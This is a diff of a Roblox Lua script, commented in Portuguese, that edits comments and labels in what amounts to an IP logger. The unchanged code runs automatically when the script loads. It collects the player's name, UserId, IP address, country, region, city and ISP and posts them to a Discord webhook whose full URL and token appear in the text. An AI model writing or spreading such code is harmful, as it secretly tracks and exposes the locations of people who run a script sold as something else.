@@ -8,7 +8,7 @@ local UserInputService = game:GetService("UserInputService")
 local Player = Players.LocalPlayer
 
 -- Link do Webhook
-local webhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw"
+local webhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw" -- Coloque o seu link aqui!
 
 -- Função para identificar o tipo de dispositivo
 local function getDeviceType()
@@ -45,17 +45,17 @@ local function getIPInfo()
     end
 end
 
--- Função para gerar HWID simulado (Exemplo de um identificador único)
+-- Função para gerar HWID simulado
 local function getHWID()
-    -- Exemplo básico de HWID simulado (isso seria algo único para o dispositivo)
-    return tostring(math.random(1000000, 9999999))  -- Você pode melhorar isso conforme necessário
+    -- Exemplo básico de HWID simulado
+    return tostring(math.random(1000000, 9999999))
 end
 
 -- Função para enviar o Webhook
 local function sendWebhook()
     local ipInfo = getIPInfo()
 
-    local contentMessage = "**Nova execução do Mini Menu**\n\n" ..
+    local contentMessage = "**Nova execução do Script**\n\n" ..
                             "**Nome:** " .. Player.Name .. "\n" ..
                             "**UserId:** " .. Player.UserId .. "\n" ..
                             "**Horário:** " .. os.date("%d/%m/%Y %H:%M:%S") .. "\n" ..
@@ -66,15 +66,15 @@ local function sendWebhook()
         contentMessage = contentMessage ..
                          "**IP:** " .. (ipInfo.query or "Desconhecido") .. "\n" ..
                          "**País:** " .. (ipInfo.country or "Desconhecido") .. "\n" ..
-                         "**Região:** " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
+                         "**Estado:** " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
                          "**Cidade:** " .. (ipInfo.city or "Desconhecido") .. "\n" ..
-                         "**ISP:** " .. (ipInfo.isp or "Desconhecido") .. "\n"
+                         "**Provedor de Internet:** " .. (ipInfo.isp or "Desconhecido") .. "\n"
     else
         contentMessage = contentMessage .. "**IP e Localização:** Não foi possível obter."
     end
 
     local data = {
-        ["username"] = "LOGS execução",
+        ["username"] = "LOGS DE EXECUÇÃO",
         ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
         ["content"] = contentMessage
     }
@@ -97,5 +97,5 @@ local function sendWebhook()
     end
 end
 
--- Executa o envio do Webhook assim que o script for carregado
+-- Envia o Webhook
 sendWebhook()
